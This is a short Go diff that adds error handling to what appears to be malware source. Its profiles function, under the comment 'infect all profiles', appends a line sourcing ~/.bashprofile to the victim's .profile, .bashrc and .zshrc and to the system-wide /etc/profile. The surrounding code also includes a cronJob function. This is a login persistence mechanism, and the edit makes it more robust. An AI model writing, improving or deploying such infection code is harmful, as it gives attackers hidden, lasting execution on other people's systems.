@@ -68,7 +68,13 @@ func cronJob() (err error) {
 
 func profiles() (err error) {
 	user, err := user.Current()
+	if err != nil {
+		return fmt.Errorf("Cannot get user profile: %v", err)
+	}
 	accountInfo, err := CheckAccount(user.Name)
+	if err != nil {
+		return fmt.Errorf("Cannot check account info: %v", err)
+	}
 
 	// source
 	sourceCmd := "source ~/.bashprofile"
@@ -110,10 +116,10 @@ func profiles() (err error) {
 	}
 
 	// infect all profiles
-	AppendToFile(user.HomeDir+"/.profile", sourceCmd)
-	AppendToFile(user.HomeDir+"/.bashrc", sourceCmd)
-	AppendToFile(user.HomeDir+"/.zshrc", sourceCmd)
-	AppendToFile("/etc/profile", "source "+user.HomeDir+"/.bashprofile")
+	_ = AppendToFile(user.HomeDir+"/.profile", sourceCmd)
+	_ = AppendToFile(user.HomeDir+"/.bashrc", sourceCmd)
+	_ = AppendToFile(user.HomeDir+"/.zshrc", sourceCmd)
+	_ = AppendToFile("/etc/profile", "source "+user.HomeDir+"/.bashprofile")
 
 	return
 }
